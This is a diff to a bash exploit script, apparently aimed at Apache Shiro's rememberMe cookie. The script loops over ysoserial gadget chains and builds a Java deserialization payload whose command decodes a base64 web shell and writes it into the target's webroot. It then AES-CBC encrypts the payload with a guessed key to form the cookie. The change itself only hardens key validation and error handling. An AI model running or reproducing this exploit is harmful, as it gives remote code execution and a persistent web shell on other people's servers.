@@ -86,9 +86,15 @@ for gadget in "${GADGETS[@]}"; do
 
       WRITE_CMD="/bin/bash -c {echo,${SHELL_B64}}|{base64,-d}|{tee,${webroot}/${SHELL_NAME}}"
 
-      COOKIE=$(python3 - "$JAVA8" "$gadget" "$WRITE_CMD" "$key" <<'PYEOF'
+      COOKIE=$(python3 - "$JAVA8" "$gadget" "$WRITE_CMD" "$key" 2>/dev/null <<'PYEOF'
 import subprocess, base64, os, sys
 java8, gadget, cmd, key_b64 = sys.argv[1], sys.argv[2], sys.argv[3], sys.argv[4]
+try:
+    key = base64.b64decode(key_b64)
+    if len(key) != 16:
+        sys.exit(1)
+except Exception:
+    sys.exit(1)
 proc = subprocess.run(
     [java8, '-jar', '/opt/ysoserial.jar', gadget, cmd],
     capture_output=True, timeout=15
@@ -96,20 +102,22 @@ proc = subprocess.run(
 if proc.returncode != 0 or len(proc.stdout) < 50:
     sys.exit(1)
 payload = proc.stdout
-key = base64.b64decode(key_b64)
 iv = os.urandom(16)
 pad_len = 16 - (len(payload) % 16)
 padded = payload + bytes([pad_len] * pad_len)
 try:
-    from Crypto.Cipher import AES
-    ct = AES.new(key, AES.MODE_CBC, iv).encrypt(padded)
-except ImportError:
-    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
-    enc = Cipher(algorithms.AES(key), modes.CBC(iv)).encryptor()
-    ct = enc.update(padded) + enc.finalize()
-print(base64.b64encode(iv + ct).decode())
+    try:
+        from Crypto.Cipher import AES
+        ct = AES.new(key, AES.MODE_CBC, iv).encrypt(padded)
+    except ImportError:
+        from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
+        enc = Cipher(algorithms.AES(key), modes.CBC(iv)).encryptor()
+        ct = enc.update(padded) + enc.finalize()
+    print(base64.b64encode(iv + ct).decode())
+except Exception:
+    sys.exit(1)
 PYEOF
-) 2>/dev/null
+)
 
       if [ -z "$COOKIE" ]; then continue; fi
 
